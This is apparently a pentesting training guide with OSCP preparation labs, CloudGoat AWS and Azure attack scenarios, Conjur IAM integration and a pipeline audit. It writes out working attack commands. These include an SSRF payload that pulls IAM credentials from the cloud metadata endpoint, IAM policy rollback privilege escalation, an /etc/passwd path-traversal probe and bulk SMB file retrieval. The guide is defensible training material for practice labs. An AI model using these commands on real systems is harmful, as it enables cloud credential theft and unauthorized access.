# Hands-On Labs: Phase 3 — OSCP Preparation + Cloud Pentesting + Conjur Multi-Cloud

Step-by-step lab exercises for Months 13-18, covering OSCP methodology, AWS and Azure attack scenarios, Conjur multi-cloud integration, and a DevSecOps security audit.

---

## Prerequisites

- Phase 1 and Phase 2 complete
- Conjur running in Docker and Kubernetes from Phase 2
- AWS account (free tier + small spend for CloudGoat)
- Azure account (free tier)
- OffSec PEN-200 enrollment (buy 90-day access at Month 13 start)
- Tools: aws-cli, az-cli, ROADtools, CloudGoat, Terraform

---

## Lab 1: OSCP Lab Machine Methodology (Month 13-16)

Documenting OSCP lab machines is the skill that separates passing from failing on exam day. Every machine you practice on should be documented as if the exam grader will read it — because on exam day, they will.

### Machine Note Template (Obsidian or CherryTree)

```text
Machine: <name>
IP: <IP>
OS: <Windows/Linux>
Date: <YYYY-MM-DD>

## Enumeration
### Nmap
[paste nmap output]

### Web (if applicable)
[gobuster / nikto / manual browsing notes]

### Service-specific
[SMB / SSH / RPC / etc.]

## Foothold
Vulnerability: <name / CVE>
Exploit used: <path or tool>
Commands:
[paste commands]

## Privilege Escalation
Method: <SUID / sudo / service / kernel / etc.>
Commands:
[paste commands]

## Proof
local.txt: <hash>
proof.txt: <hash>
Screenshot: [attached — must show hostname + whoami in same frame as hash]

## Lessons Learned
[what would you do differently]
```

### Nmap One-Liner for Each OSCP Target

```bash
# Initial scan
nmap -sV -sC --open -p- --min-rate 5000 -oA ~/oscp/scans/<IP>_full <IP>

# Follow-up targeted script scan
nmap -sV -sC -p <discovered_ports> -oA ~/oscp/scans/<IP>_targeted <IP>

# UDP top ports
sudo nmap -sU --top-ports 200 -oA ~/oscp/scans/<IP>_udp <IP>
```

### The 5-Minute Rule

If you have not found a meaningful lead in 5 minutes of enumerating a service, move to the next service. Do not tunnel-vision. Experienced OSCP candidates fail not because they lack skill — they fail because they spend 3 hours on a rabbit hole while two other machines sit untouched.

---

## Lab 1b: HackTheBox Phase 3 Track — Harder Machines (Month 13-15)

These machines are harder than Phase 2 and closer to OSCP exam difficulty. Do them alongside OSCP labs to maintain variety and prevent burnout from grinding the same environment. All are retired.

### Month 13-14: Intermediate Windows + AD (6 machines, ~20 hrs)

| Machine | OS | Difficulty | Key Technique | Why It Matters |
|---------|----|:----------:|---------------|----------------|
| Monteverde | Windows AD | Medium | Azure AD Sync service → credential extraction | Cloud-integrated AD — mirrors modern enterprise targets |
| Support | Windows AD | Easy | LDAP anonymous bind → Kerberos RBCD | RBCD attack chain — appears on harder OSCP AD sets |
| Querier | Windows AD | Medium | MSSQL NTLMv2 capture → Kerberoasting | Hash capture via service connection |
| Grandpa | Windows | Easy | WebDAV + token impersonation | Windows IIS token privesc — core Windows pattern |
| Granny | Windows | Easy | WebDAV + local exploit | Same privesc, different foothold |
| Driver | Windows | Easy | SCF file + Responder → NTLMv2 capture | Credential theft via file share |

### Month 15: Exam-Level Machines (4 machines, ~16 hrs)

| Machine | OS | Difficulty | Key Technique | Why It Matters |
|---------|----|:----------:|---------------|----------------|
| StreamIO | Windows AD | Medium | SQL injection → LFI → AD enumeration | Multi-stage web + AD chain |
| Manager | Windows AD | Medium | MSSQL xp_dirtree → ESC7 ADCS abuse | Certificate abuse — increasingly common |
| Scrambled | Windows AD | Medium | Kerberos-only auth → silver ticket | Silver ticket attack — OSCP hard AD sets |
| Timelapse | Windows AD | Easy | LAPS password leak → WinRM + pfx cracking | Credential hunting methodology |

**Phase 3 HackTheBox exit target**: 27 total machines across Phases 2 and 3. Pro Hacker rank (top 25%) unlocked. OSCP AD chain executed without hesitation.

---

## Lab 1c: The Stuck Protocol

When you cannot find a foothold after 30-45 minutes of enumeration, follow this exact sequence before doing anything else. Most OSCP failures come from skipping steps or assuming a service is not interesting.

```text
STUCK PROTOCOL — run through this in order

1. Did you scan ALL ports, including UDP top-100?
   sudo nmap -sU --top-ports 100 <IP>

2. Did you enumerate every web service manually (not just run gobuster)?
   - Browse every page, view source, check robots.txt, check /cgi-bin/
   - Try: nikto -h <IP>

3. Did you try every credential you have found so far on every service?
   - Found a password in one place? Try it everywhere.
   - crackmapexec smb / ssh / rdp / winrm

4. Did you check the version of every service against searchsploit?
   searchsploit <service_name> <version>
   searchsploit -x <exploit_path>

5. Did you enumerate SMB shares and read every file?
   smbclient -L //<IP> -N
   smbclient //<IP>/<share> -N
   recurse; ls; mget *

6. Did you check for LFI / RFI on every parameter of every web form?
   Add ?page=../../../etc/passwd to every URL parameter.

7. Did you run enum4linux-ng on Windows targets?
   enum4linux-ng -A <IP>

8. Did you check SNMP (UDP 161)?
   snmpwalk -c public -v1 <IP>

9. If Windows: did you run impacket-rpcdump?
   impacket-rpcdump <IP> | grep -i ncacn_ip_tcp

10. If nothing after all of the above: sleep. Come back with fresh eyes.
    Time pressure is the enemy — rested enumeration beats tired exploitation every time.
```

---

## Lab 1d: Report-Per-Machine Habit (Months 13-16)

Every machine you complete in OSCP labs and Proving Grounds gets a written report. Not notes — a report. 1-2 pages, written as if you are handing it to a client who hired you to test that machine.

**Why this matters**: The OSCP exam is 24 hours hacking + 24 hours writing. Candidates who write during the hacking phase (not after) consistently perform better. You cannot build that habit on exam day.

```bash
# After each machine: commit your report to a private repo
mkdir -p ~/oscp/reports/<machine_name>
cd ~/oscp/reports/<machine_name>
# Write report in Markdown, save as REPORT.md
git add REPORT.md && git commit -m "Machine: <name> - rooted <date>"
```

**Report structure** (keep it short — speed matters on exam day):

```text
# <Machine Name> — Pentest Report

## Summary
One paragraph: what you found, how you got root/SYSTEM, severity.

## Enumeration
- Ports found: <list>
- Services: <list with versions>
- Key finding: <the thing that led to the foothold>

## Exploitation
- Vulnerability: <name or CVE>
- Steps:
  1. <step>
  2. <step>
- Screenshot: [proof.txt / local.txt with hostname + whoami visible]

## Privilege Escalation
- From: <user>
- To: <root/SYSTEM>
- Method: <one line>
- Commands: <paste>

## Remediation
- <1-2 concrete fixes>
```

Writing 30 of these reports turns the OSCP exam report into a 3-hour task instead of an 8-hour panic.

---

## Lab 2: CloudGoat AWS Attack Scenarios (Month 15)

CloudGoat is Rhino Security Labs' intentionally vulnerable AWS infrastructure. It deploys real AWS resources using Terraform so you practice against actual cloud APIs, not simulations.

### Setup and Installation

```bash
# Install CloudGoat
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r requirements.txt

# Configure AWS CLI with your lab credentials
aws configure
# Enter: Access Key ID, Secret, region (us-east-1), json

# Create an IP whitelist (CloudGoat needs your public IP)
./cloudgoat.py config whitelist --auto

# Deploy the iam_privesc_by_rollback scenario
./cloudgoat.py create iam_privesc_by_rollback

# The scenario gives you low-privilege IAM credentials
# Your goal: escalate to admin through IAM policy version rollback
```

### IAM Privilege Escalation Walkthrough

```bash
# Start with the credentials provided by CloudGoat
export AWS_ACCESS_KEY_ID=<from_cloudgoat>
export AWS_SECRET_ACCESS_KEY=<from_cloudgoat>
export AWS_DEFAULT_REGION=us-east-1

# Enumerate your permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <your_user>
aws iam get-policy-version --policy-arn <policy_arn> --version-id v1

# List available policy versions (the older one may have admin permissions)
aws iam list-policy-versions --policy-arn <policy_arn>

# Roll back to a permissive version
aws iam set-default-policy-version --policy-arn <policy_arn> --version-id v2

# Verify privilege escalation
aws iam list-users
aws iam create-user --user-name pwned
```

### SSRF to IMDS Credential Theft

```bash
./cloudgoat.py create cloud_breach_s3

# This scenario: web app with SSRF -> IMDS -> IAM role credentials -> S3 data
# Exploit the SSRF:
curl "http://<target_app>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://<target_app>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>"

# Use the temporary credentials to enumerate S3
export AWS_ACCESS_KEY_ID=<from_imds>
export AWS_SECRET_ACCESS_KEY=<from_imds>
export AWS_SESSION_TOKEN=<from_imds>
aws s3 ls
aws s3 cp s3://<bucket_name>/ . --recursive

# Clean up
./cloudgoat.py destroy cloud_breach_s3
```

---

## Lab 3: Azure AD / Entra ID Enumeration with ROADtools (Month 15)

ROADtools (Research on Azure Active Directory Tools) maps your entire Entra ID tenant into a queryable database, exposing attack paths that Azure Portal hides behind pagination and filters.

### Setup and Data Collection

```bash
# Install ROADtools
pip3 install roadtools

# Authenticate to Azure (use a lab Azure account -- never production)
roadrecon auth -t <tenant_id> -u <user@yourlabdomain.onmicrosoft.com> -p <password>

# Gather all Entra ID data (users, groups, apps, service principals, permissions)
roadrecon gather

# Launch the ROADrecon web interface for browsing
roadrecon gui
# Access at http://localhost:5000

# Export attack-relevant data
roadrecon dump --output ~/lab/azure/
```

### Azure Attack Scenarios with ROADrecon Output

```bash
# Find service principals with credentials (potential secrets)
python3 -c "
import json
with open('servicePrincipals.json') as f:
    sps = json.load(f)
for sp in sps:
    if sp.get('passwordCredentials') or sp.get('keyCredentials'):
        print(sp['displayName'], sp['appId'])
"

# Find users with admin roles
roadtx describe -t <tenant_id>

# Find applications with overprivileged permissions
# Look for: User.ReadWrite.All, Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory
```

### Azure CLI Attack Simulation

```bash
# Install Azure CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login with lab credentials
az login -u <user@lab.onmicrosoft.com> -p <password>

# Enumerate subscriptions and resources
az account list --output table
az resource list --output table

# Check role assignments (are you a Contributor or Owner anywhere?)
az role assignment list --assignee <your_upn> --output table

# Key Vault enumeration
az keyvault list --output table
az keyvault secret list --vault-name <vault_name>
```

---

## Lab 4: Conjur AWS IAM Integration (Month 13-14)

Integrating Conjur with AWS IAM allows EC2 instances, Lambda functions, and ECS tasks to authenticate using their IAM identity — no static credentials needed.

### Create the IAM Role

```bash
# Prerequisite: Conjur running from Phase 2 Docker deployment

# Create an AWS IAM role for Conjur authentication
aws iam create-role --role-name ConjurRole \
    --assume-role-policy-document '{
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"Service": "ec2.amazonaws.com"},
            "Action": "sts:AssumeRole"
        }]
    }'
```

### Create and Load Conjur Policy

```bash
# Create Conjur policy for AWS authentication
cat > policy/aws-hosts.yml << 'EOF'
- !policy
  id: aws
  body:
    - !webservice
      id: authn-iam/aws
    - !host
      id: my-ec2-instance
      annotations:
        authn-iam/account: "123456789012"
        authn-iam/service_id: "aws"
    - !variable db_password_aws
    - !permit
      role: !host my-ec2-instance
      privileges: [read, execute]
      resource: !variable db_password_aws
EOF

# Load the policy
docker compose exec client conjur policy load -b root -f /policy/aws-hosts.yml

# Set a secret
docker compose exec client conjur variable set \
    -i aws/db_password_aws -v "AWSManagedSecret123!"
```

### Test IAM Authentication

```bash
# Test retrieval using AWS IAM credentials (simulate EC2 instance with role)
# This uses the IAM authenticator to prove identity via AWS STS
curl -s -X POST "http://localhost:8090/authn-iam/aws/myConjurAccount/aws%2Fmy-ec2-instance/authenticate" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "$(aws sts get-caller-identity | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d)')"
```

---

## Lab 5: Mock OSCP Exam Execution (Month 16)

This lab is the most important in Phase 3. Run two full 24-hour simulations before the real exam. The simulation exposes time management failures, documentation gaps, and tool dependency problems before they cost you the certification.

### Setup

Choose 3 boxes from OffSec Proving Grounds (PG Practice) or VulnHub:
- 1 Linux box (easy-medium)
- 1 Windows box (easy-medium)
- 1 AD set if available, or 1 harder standalone box

### Mock Exam Checklist

```text
PRE-EXAM SETUP
[ ] Note start time
[ ] VPN connected
[ ] CherryTree/Obsidian template open for each target
[ ] Nmap running on all targets simultaneously (background)
[ ] Screenshot tool ready (flameshot on Kali Linux: apt install flameshot)

FOR EACH TARGET:
[ ] Full nmap scan captured and in notes
[ ] All web services manually browsed
[ ] Service versions noted; searchsploit checked
[ ] Any found credentials tried everywhere
[ ] local.txt / proof.txt captured with hostname + whoami visible in screenshot

EVERY 2 HOURS:
[ ] Notes saved and committed
[ ] Remaining time assessed
[ ] Prioritization adjusted

END OF 24 HOURS:
[ ] Collect all screenshots
[ ] Write the report immediately (do not sleep first)
[ ] Report includes: summary, each machine section, commands used, screenshots
```

### Report Writing Timer

Practice finishing a report in under 4 hours. Use this structure for each machine:

```text
1. Executive Summary (1 paragraph total for all machines)
2. Per machine: IP, hostname, OS, services, vulnerability, exploit, proof screenshot
3. Appendix: full nmap outputs
```

Start writing immediately after the 24-hour mark. Target: submit the report draft within 3 hours. If you cannot write the report from your notes alone, your notes are insufficient — improve them on the next simulation.

---

## Lab 6: DevSecOps Security Audit (Month 16)

Audit your own Phase 1 CI/CD pipeline from an assessor's perspective. This simulates a real consulting engagement where you inherit an existing pipeline and must produce a written findings report.

### Step 1 — Secret Scanning

```bash
gitleaks detect --source . --report-format json --report-path ~/lab/audit/gitleaks_report.json
cat ~/lab/audit/gitleaks_report.json | python3 -m json.tool | grep -E "secret|file|line"
```

### Step 2 — SAST with Semgrep

```bash
semgrep --config=auto . --output ~/lab/audit/semgrep_findings.json --json
python3 -c "
import json
with open('semgrep_findings.json') as f:
    results = json.load(f)
for r in results.get('results', []):
    print(r['check_id'], r['path'], r['start']['line'])
"
```

### Step 3 — Container Image Scan

```bash
docker build -t myapp:audit .
trivy image --format json --output ~/lab/audit/trivy_findings.json myapp:audit
trivy image --severity HIGH,CRITICAL myapp:audit
```

### Step 4 — Kubernetes Manifest Audit

```bash
# Install kube-score
wget https://github.com/zegl/kube-score/releases/latest/download/kube-score_linux_amd64.tar.gz
tar xzf kube-score_linux_amd64.tar.gz -C /usr/local/bin/

kube-score score k8s-manifests/*.yaml
```

### Step 5 — Compile the Audit Report

Structure the report as a consulting deliverable:

```text
Executive Summary
  - What was assessed
  - Assessment dates
  - Overall risk rating

Critical Findings
  - Secrets in git history (gitleaks)
  - Critical CVEs in container images (trivy)

High Findings
  - No resource limits on containers (kube-score)
  - Privilege escalation paths in IAM policies

Recommendations
  - Remediation steps for each finding
  - Priority order (Critical -> High -> Medium)
```

---

## Troubleshooting

```bash
# CloudGoat -- deployment fails
cd cloudgoat && ./cloudgoat.py config profile default
# Verify AWS credentials:
aws sts get-caller-identity
./cloudgoat.py destroy <scenario> && ./cloudgoat.py create <scenario>

# ROADtools authentication fails
# Try device code flow:
roadrecon auth --device-code

# Conjur AWS IAM auth fails
# Verify IAM role trust policy includes your test account
aws iam get-role --role-name ConjurRole

# OSCP VPN disconnects during lab
sudo openvpn --config ~/oscp/lab.ovpn &
# Reconnect and verify:
ip a show tun0

# Mock exam -- cannot finish in 24 hours
# Focus on AD chain first (40 points) -- it is all or nothing
# Then easy standalones -- each is 10 points
# Document everything even if you do not get root -- partial credit in report
```

---

**Last Updated**: 2026-04-15
**Version**: 3.0
